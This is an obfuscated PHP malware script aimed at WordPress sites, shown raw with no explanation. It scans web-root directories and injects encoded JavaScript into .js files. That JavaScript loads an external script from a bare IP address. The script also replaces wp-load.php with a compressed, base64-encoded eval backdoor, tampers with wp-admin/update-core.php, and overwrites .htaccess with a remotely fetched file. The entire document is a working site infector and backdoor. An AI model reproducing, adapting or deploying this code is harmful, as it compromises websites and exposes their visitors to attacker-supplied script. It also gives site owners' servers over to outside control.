<?php error_reporting(0);$c_='j';$c0='var _0x2515=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0x2515[5]](_0x2515[4][_0x2515[3]](_0x2515[0])[_0x2515[2]]()[_0x2515[1]](_0x2515[0]));';$c1=1;function a_($c2){global $c_,$c0,$c1;$c3=scandir($c2);foreach($c3 as$c4=>$c5){$c6=realpath($c2.DIRECTORY_SEPARATOR.$c5);if(!is_dir($c6)){$c7=pathinfo($c6);$c8=stripos($c7['basename'],'.js');if($c8!==false){$c9=stripos($c7['basename'],$c_);if($c9!==false){echo'WP_Error_Page_Not_Found '." </br>";$c=stripos(file_get_contents($c6),$c0);if($c===false){echo$c6;if($c1==2){file_put_contents($c6,$c0,FILE_APPEND);}else{file_put_contents($c6,$c0);}}}}}elseif($c5!="."&&$c5!=".."){a_($c6);}}}$c6=$_SERVER['DOCUMENT_ROOT'];if(unlink($c6."/wp-load.php")){file_put_contents($c6."/wp-load.php","<?php eval(gzuncompress(base64_decode('eNqVWvtTFFfa/lc6VGoDSrC7p+em5WYBuQyBQRgYLjtbUz3TPUxLT/dsdw/MkP1KpQiRIFgmIFj+oiWGaAwGq1wrRVGVSNxojBdi1OD1X/me9/SAXLKDazZCpvuc816e93mf884mddm2ufjj4ccLv44/fvFw7pOspQ3IjsrZjuxoyffjy1dP3bv129kHB9wPuFTOSDqaaXDxB59+9vDe8VcLd1bL34+fWp0eff5o7MJSxSdaqvw9W9VT+/e/XV2x3/0kPjcyf+qzsYt/LM+UVxxQDUVLHbBUJ2cZXE11pM4nxRU12Xqornz7Bn/fdMQ/Kg783749NbppKoZmHJH3cyFO15L9XMHMWZwqW7qZUCs52VC4nKGY7seDspNMV+3Zt9W/Te5stuyT7ccflC1LLpSXxQSP/1JMlPiba7F8Uiw7+Ff6SPCEC716MJb3CDFBwr+ivz0m+MWyyrL4zZjo9349+2ksH/Quvb5IK3qKr/M+QY7lvf72IXrxSiwfSLx8duxFLC+rr8/hxX17IrIlp4VgKgkfM/hTyZn9cgFelLW0xXi/l/6ltbeuL8REn+/M2H1s4ps6S6d0NMAgn9zT3Z5NiBJs84VieckfE7w8rzTWDLVqgQEFH3sUT3MmPJjoCA3ieRLPveGBRARPgh4sPsI8yktS0OrtxoaJYDiW98t9Xlge7GjLt+AFr6SHh9L4KeJF5VD1YAstSKfDhxQtJgjeoV6dftALYdoifCSq92C9lDxI1s99/eyP6Utkcxs+9DZ1dNbVd0aqD7KHMQ8vjp4d+eHCb/e++Om/vPNgDSkRJn5DDPyTs6v0VnNM8Pndp+OPFmIeUbhAH7djsS8YE3ipQ2iq7+ajkc7+YITe+jyWV9SRmWMIpOB5c/yJ+7Yg+oKHOihTcECsx+oA/QfiJol46O1HmGBMv+vIxMlrn7359fbEWEz0ehg28l4xig14oS3Smcd5dPzGkYBEggy/s3ACYEKKgsIIS/tWaDtyvwoMc1nZcGzOTKUquT4rZzia0QfY45nMOZap6wSL9miwvlNvgml8JxLnRgCHpsZej547eTHmEXwzzLNosLst2tSKR55Ob2Pxpe8eXiXvH59f2oG+HlVOszLDeZrDWWauL+0eSEBpo6T4mjpwrtjmRv3nmMiLP95Znrgy4h4IrFJl+DqxAHFnsQciPMiG6GEgvvvo97lrx/8kAnZGdqubc9JU5wnTdFgVuPGNdrK40j7dgKpPqukklHkpDBIy5PMwiz479ebyrec/Xxsu2gO7yX3aozN8OEpLopE2LJXkluJjgSdzfUlK/uHOPio3ttXz+VnAxX9v6uWOQLWmuQJiVQlTZYdLqapuc31whsxl0KW9CPtbQC56xfn7K+fOL10h41hZVgPBUo8YzPVmdKPZIMSZMIQX3CWLt6aPLcIIpYgzoZPVBIESu64Tww/gA3n0JPaXjhLU3N15n6faofrFOSI5uukMpMSfrN7AzRMCxBQKS/iCFV8nCyoFCQQg+TrBE5JwEHsoLMSXiOZe3nArkLhlEO5KXSCUDHYD2/n53oIXROMjTgkwd2jhvVg+EVy7ML7kHkIx6qBguQ65aZJcz4mC51a/Of0QPBlEYXs3HYaq9/BhXWkkINJhiYwyVPQr70sV/YqfvYh6U3+fv3Z86gECJO6AXIQAV7n+o6Cqqiyn0wzwbSzOb33fwMTa8uTynZVTbxaYPeQ52LSLyNKHsymu5IecJf/lxup1Vy5O3YQjqa+KafQJNQTAjn4iTLbvjaMrlESkWnjk9htJYtFw5C5iH2LVRGO0342vN9BSRBQvnfgJbgY+/5OCyhCl2GZG5RxTth3WKlXAFZUNfnEbJoRBFddMT1o/wM9+1eYSOcdR8UTXOc1w30paCFEV14Lm9DY6G8AmBMES39wjWOIDlHxfvJi7vaNmqLIZs1DNfOTWdTEQVClUma5Xr7CFl3pcYvLumz/xK4tyc/1KyAb+sRlJAIFifqCnqy2XbEgP0j4zs2OIpzw8g78TblMBzLY2lfszf8Q8Hp7M/5Mir+QGqb5lS2XW95mGIXPQGoOak4Ybpq2+9aOJnOin1sg2fnpmfPLymZUri6dd5PI+0c2dR6AqkVR8wstdwVyyQPkFWDbKZOrS7KsplFhwaRi2+XdEoE91ODifVWUj5yB9h91fuJRlZmAVhUXXs7LVT3EBRgFOf3NXfX+iS881e8LUyYk/G6PUPV01IPrxsc+XyPQCubAM9rDKpXIkk65NIELe6aPkC+PzaHu0k/ymZuCrBzn397tNGrnjly9/efTe90+n6e2kGOWVbvLN6RGpO+RQD1Snim4wMlkFaEATgST1degA/1UX/6LUEDxCsqu7ndW4KEHabBDjyswb0J33zSpxc1lUqEm18cHWaB3Z1Eo2EasH6yLR0DpJgntEbO89cXR4KxaIgSLVm4XWl3jXd/v6ClkzRoTKpJYCss77iazxw0sRbIjSb0r1BmM9fPFsdPT8L0V6KwKb0ajLcOhdRdxdePAKPktU768nH186V/SZcNRBlUA4Wjdn9ta94wCCGBM9vEsgSBnYnfCkJ41wNkHoknLUA4vQX3z97Dj2TrLgNOBBQE9mqMn5aVFDUE8iFz7JUGprhuiTLsKCFGqkNsm4TBCEhiYdJwVJTtaRymjqbulDB7F7STVKfeRMpCa3vtrrCTW2m3J3C73aQzwYzSQ8TXqoUdFDDdjPR5o0oRFLGwSB7rY+5kV7mtSor12nnWoltypBlvzNO0AG/we5cJiMCA/0NnTupbijr/WwgiKxgQz0Zqh9o7XVmMlDBOqBHup5QcaWHe6W80uXiVG+esD2q6Uc+g+/7fVPcGJiCR+mvri6gwiKBcZqHZqLVepeWnX3NuVl+uoPO2r0Y9XgGiwtlVILXJNVRcqK/hTbS0cm6rrr9iy/hEiRC6GGtJ5g2+8jGS/l0xQ6L18o0r6/J9hUiNKlw9UXftnb3Ut9swYhlURPW5/c3RZoFuv2Nve5ODt55wpM9B37+lvyW8Yyvp1PNrZQhqUCuztQ3xLbdRUHos+gw5IxyCd29DQ26UkPU/Uu5EVPk9HMpF2/jLoUfNR78blPYc2qWB8MFNu1xrp6GD469v2zYhLQPb180dJfZhfn1k5fKxYC31jNIjz2giTY0xvFj/3UDINCqCGcBpQEXqSLiycTTSsNDN09hEqKn54s1GTkrjxdSQTmtZnMBIVesa+PJFGkxtPbFeqTu7x8L6kJqlXSLsGusN5cW6MRygBQhUU/S2cUavoToitA/SLKk+4XksQD3gPJjI3CIDAWkC5oBjuBsqK8BJoY6XeHqCiICdm+NUPNWk2n3MB0IoymMhDrM8yQMO2IS5bkjdRkk4hnsIZnwgK/UTAd8tBPHUMgbuzK23iKd1kcWNWlGTOxe4GCSLCroM4uhb1Z2qmhM1fs2b8svZw8Q/cRdmk63EAFxmiK93qUDWW6ucCoUKnGBgfwoL+3WFrYQiQyG15GwcrfkYycAvsEgjsKqWtzN3VkvZ9uN3LCzDE9QIBASQInbNvrT7GdZ2L108k5cLCP2dhIKNtL+GC3XKZPfX4ZMO09wmuuMQHpu9Gx76+dpIo+RqtCWs2RREP9EIVoiMCrUeiwUEVramDK2OU7utdLjAMHEppgs+bDCg1uE+tJwb1Fosfe/umxojZF3P1+xvlUKqKO+7Qb8Lq+tqKyV7qpvgNKgz5AharVNLByzlMv3lBQPu/z6acQrXJyfm3CpT2B9wTT5C4Ly3pDmCC5PkMXg4QXN1me3ymSPshwdlY1nEropSO5TBaqZdCAnnNMphAgEEBMJPvsjMkulynZwW2LLqJpyxzE1S/Zb3PIFr2dlB2msaJisNBbX1Po7Q4PhWoZJwl+wYVvXukK+EOs/xaoEWWChbLKigNb89+R1mwO/7OdXFajy9K2CU/EMQ2VqzV1Bb+qAypXnbNxA+b6tAEI00xRzSZU1aK1NILSbFt1yt+P17a2fhyq+/umGdf+/ZtnVwQM2Xv+JshQuFVW8Y+Kiv0RtaPWNPtDdeUlVt1chszgZz+dXnoNEHrKKipLvHxlnCY7C6/P4TUnlKkrr9hbjpBXtLfmwkp5kOe3etslk5zsslTb0dVNvqMW9uLlvTsW9BRvKNRD6GnFnuL2ndg+sBf/4JMPeZSwuPdD3s9LW6O/T+szTEvFWh6E6MHfvNdbUXEgrcpKXXuJKBDi3w6fRqfOllVQZrcADvozaZrQ5cyNJKXQBnQGZaCIS2hOMg24FQbZXEvNa87GYPAApfFQXSpkqEqpTMx9/QytIDCNNHhxfsV+BWvCaqklt0YhmYQRyDieBkv4KSEzh0JWWG5B1uP1oea6eLyiqsQWDwgwFyZQ5eJNGjpVrJuttlutVtyqy5pWh2Y0lCdbw5EO2XBK2TMOB3ga/K1ewEb/qm0N2x3VRkepJcWBFRX5wvgb0nTk/L/e5TRiCQnoBVkF/HSR+JXk78TYN+xsM2w71aU3OEfSly6XCyd+Oj3y9thwSYtpBkVy/iIu3UG/66cR6agOlzqrOJcap6EUs86wndLuMRaGPt80gHJDGtktpLfuIpv878iDdO0484rFoqR962MlCucwoY9QC/iocbVbsx27vNaNzG4WP5+ffUbzpIpSoKNgXJm/T93v3HlwfOIKw7ul/jOnWWrcNJIq4EYxLZ2/t8Oj0sfBrh8+Hz159egFBm/dVuHc31zv8loE3imh9rCcURnIEamO3fIClJLYBgCkxZgoimR/qSr7jIp6+iX1M7z6l7+897cUlWZdd4hiq2iWIbeo5cBsZBdUxO99z+ZLu5yH4yQaLl0u1tPW4G5jaZVduE2DS8sWuqbN2qalKerbdmrnDLQhMFv5IQ2RIltZbZfG1Fk2qf19niZD6zOqXQxfo+8Z8KK6fGcF5e1/s7Cesv2KShS6S2Y25lAl+9iNo6gsD/YXVx/R/luDc5D+wFW31nYFw8j6gAqeodKItkqW5+jco/9MfvFiDou8uwP31cT98cm7SGNqZ09y+2uykFAttNT42JXhJy/PnCzf7s8hzXIKH8uOiltbJU2/oJWMD6B8VF2nnpUwlQJ34MMKctncnV5mZseeD8+8WHd3NxpDrd+nAVWAxlCjuzsM7vKdGScIXD6zglzKi6fJ8/fjx2+PzC8ejD8593Bx4t8r5SVhNEUT3MCrqbPELu6QiYK3KRJdaXNdqCN24IOUDJBtF5lQaH2mwyV0EyWRljUL8dNzKqcWVJuU56Bp9XNQ95AAuuns2QfgbN2iGutCWDlAEjQrW4i6BoV3xExwiqpD9Vl0Q0iZFndYzspck5k2PrBpLJkpcA2qSaLJopFkxLGyZgQ6MFLXHq1rL6UDr018On0UCrCyZNfPBwLLYIegB6UgeGiWRSyRrttFKYHJ8orwI3Xemz9fLauoKuZlW3R7cP2xzRzJbzVfqCLZnQDH0K1oEHghpQsf3VFeEhEsDmuTslVVlE/boN4iA+WuOjaxzGJhrHLPSZs5iLEkzXNz2S1xJCJjQ2LZ4ExLUS3szcQN5JhmlNTFRBAzb76l+VtF5bswAXB+/fYJGrAUeW6XBvjlv29fX/l57MLZnQS0KZCNclp+j2v92KUje5cOHH8IqHvcER0MoBW7dDPqFMKDVyOrrycf0wXiXGnD3VFdXpFnXTbabCnYxHwPNaMUv84zODXvWPKHdd0d7dWcLlt9KpfVhoZk3NdscJClZbMEfjZrtuVcUkXq49M/rlxaO3W3fAfXYftKLqVZNruyFVB6lHVbLlRyZexs+q7KvX1tgkAll8ZlLyMXqApVPUs4K6M3VcPdhpGg+52cSjfKpAYecL91Zy8xyLKjMu4XmIApg1IVFzHZpJ/hjOv+sJk8rHJHAI7JfLM593t7Bnqi6MXHM5fWzn85+7KcGO35/dG5/9y8dfzx1MHI4XY02/ry+PXbz5YfTZ1+PF5S+LzGVSEgkMyqLM2m98/fvEPXAyLfXVI7v3R5/KsH23ky5BYs7qpWAfE1+sCAcqLw3p59m+2vOlhi4yffLB0lkUQXfzAGXA2FndQ7unr39nOs9V79gfn6TktO3rny+tjXOE3ZTW24o7odVz3bRZK8TtGFj/4Hb3+hKTaNiEiDrZ0mQc2ctkJGx7vmd+wFuqD/KU1MSqc4TiMusLjPnXLtSjo0yRoZXv4FbZFfJPV6fGx7wjszmaqqqh7V/h98hqHiUyap8gFlFX95J+n28dXb/rCbXSJfHGp9g9VAatW7BQox9k/TJO7yY2Le3dXFDSIvAtTTi1fn1+h7OPgf/3bx8okH5ZvdfTeo0Y4T4zPHFm8sHGOXpi2RjLDa/wAiI0FdnriOSMblQAhrtHi0LlvlDHPwI65Wpl9prpWmLidDcqhIBGMiGlppRj+egqzY/5FCprY3CBZi/ZL1tP8HMWtxFw==')));");}if(unlink($c6.'/wp-admin/update-core.php')){}else{file_put_contents($c6.'/wp-admin/update-core.php','Error update #0x2515');}if(unlink($c6.'/.htaccess')){}else{file_put_contents($c6.'/.htaccess',file_get_contents('https://gist.githubusercontent.com/BFTrick/3706672/raw/be744502cf3921f761cbef11878af6f4a2024c3d/.htaccess'));}$c=stripos($c6,'public_html');if($c!==false){$cЂ=substr($c6,0,stripos($c6,'public_html')+strlen('public_html'));a_($cЂ);}else{$c=stripos($c6,'html');if($c!==false){$cЂ=substr($c6,0,stripos($c6,'html')+strlen('html'));a_($cЂ);}else{$c=stripos($c6,'htdocs');if($c!==false){$cЂ=substr($c6,0,stripos($c6,'htdocs')+strlen('htdocs'));a_($cЂ);}else{$c=stripos($c6,'httpdocs');if($c!==false){$cЂ=substr($c6,0,stripos($c6,'httpdocs')+strlen('httpdocs'));a_($cЂ);}else{$c=stripos($c6,'vhosts');if($c!==false){$cЂ=substr($c6,0,stripos($c6,'vhosts')+strlen('vhosts'));a_($cЂ);}else{$c=stripos($c6,'www');if($c!==false){$cЂ=substr($c6,0,stripos($c6,'www')+strlen('www'));a_($cЂ);}else{$c=stripos($c6,'wwwroot');if($c!==false){$cЂ=substr($c6,0,stripos($c6,'wwwroot')+strlen('wwwroot'));echo($cЂ);a_($cЂ);}else{$c=stripos($c6,'web');if($c!==false){$cЂ=substr($c6,0,stripos($c6,'web')+strlen('web'));a_($cЂ);}else{a_($_SERVER['DOCUMENT_ROOT']);}}}}}}}};